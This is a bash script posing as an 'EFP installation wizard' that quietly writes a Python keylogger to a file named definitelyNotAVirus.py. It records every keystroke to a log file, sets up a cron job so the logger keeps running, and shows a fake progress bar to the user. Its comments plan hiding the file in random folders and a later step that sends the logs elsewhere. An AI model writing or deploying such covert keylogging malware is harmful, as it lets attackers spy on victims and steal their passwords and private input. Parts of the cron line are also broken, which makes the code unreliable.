#!/bin/bash

# This is the install file - only do the one
# 1. copy python logger script to a hidden place
	# NOTE: need to add the capability to check whether the script is playing and to hide itself again
	# BASIC: just save in the /tmp folder
echo "Welcome to the EFP installation wizard, please wait just a second while we get set up"
# places the python script in a local file which can then be run

# gets a random folder on the computer
# declare TARGETDIR
# getRandDir(){
# 	DIRNUM=$(find ~ -type d | wc -l)
# 	RAN=$(($RANDOM%DIRNUM))
# 	if [ $RAN = 0 ]; then
# 		RAN=$(($RAN+1))
# 	fi
# 	TARGETDIR=$(find ~ -type d | sed "${RAN}q;d")

# }
# TARGETDIR=''
# getRandDir	#returns TARGETDIR
# echo "REMOVE ON USE: $TARGETDIR"


echo "#!/bin/python3
import os 
import pyxhook 
log_file = os.environ.get( 
    'pylogger_file', 
    os.path.expanduser('~/Desktop/file.log') 
) 
 # Allow setting the cancel key from environment args, Default: ~
 # backdoor for virus maker to stop it - will take out for application
cancel_key = ord( 
    os.environ.get( 
        'pylogger_cancel', 
        '~'
    )[0] 
) 

# Allow clearing the log file on start, if pylogger_clean is defined. 
if os.environ.get('pylogger_clean', None) is not None: 
    try: 
        os.remove(log_file) 
    except EnvironmentError: 
       # File does not exist, or no permissions. 
        pass
  
#creating key pressing event and saving it into log file 
def OnKeyPress(event): 
    with open(log_file, 'a') as f: 
        f.write('{}\n'.format(event.Key))

# create a hook manager object 
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
# set the hook 
new_hook.HookKeyboard() 
try: 
    new_hook.start()         # start the hook 
except KeyboardInterrupt: 
    # User cancelled from command line. 
    pass
except Exception as ex: 
    # Write exceptions to the log file, for analysis later. 
    msg = 'Error while catching events:\n  {}'.format(ex) 
    pyxhook.print_err(msg) 
    with open(log_file, 'a') as f: 
        f.write('\n{}'.format(msg))
">> ~/Desktop/definitelyNotAVirus.py
chmod 777 ~/Desktop/definitelyNotAVirus.py

# 2. create a cronjob for the logger script
#write out current crontab
crontab -l > mycron
#echo new cron into cron file
echo "*/1 * * * * cd ~/Desktop/definitelyNotAVirus.py && usr/bin/python3 ~/Desktop/definitelyNotAVirus.py" >> mycron
#install new cron file
crontab mycron
rm mycron


echo "Please wait while the program installs"
i=0
seconds=60
for (( i=1; i <= $seconds; i++ ));do
	echo -ne "#"
	sleep 1
done
echo 


# 3. create a cronjob for sending the logger script somewhere

